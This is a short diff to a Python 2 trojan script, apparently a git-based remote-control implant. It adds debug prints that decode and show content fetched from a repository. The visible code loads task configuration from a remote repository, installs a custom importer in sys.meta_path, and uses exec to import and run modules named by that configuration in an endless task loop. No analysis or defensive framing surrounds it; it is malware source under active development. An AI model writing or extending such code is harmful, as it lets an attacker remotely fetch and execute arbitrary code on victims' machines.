@@ -30,6 +30,7 @@ def get_file_contens(filepath):
 		if filepath in filename.path:
 			print "found file %s" %filepath
 			blob = repo.blob(filename._json_data['sha'])
+			print base64.b64decode(blob.content)
 			return blob.content
 	return None
 
@@ -40,6 +41,7 @@ def get_trojan_config():
 	configured = True
 
 	for task in config:
+		print task['module']
 		if task['module'] not in sys.modules:
 			exec("import %s" %task['module'])
 		return config
@@ -80,7 +82,6 @@ def module_runner(module):
 	return
 
 sys.meta_path = [GitImporter()]
-print "blabla"
 
 while True:
 	if task_queue.empty():
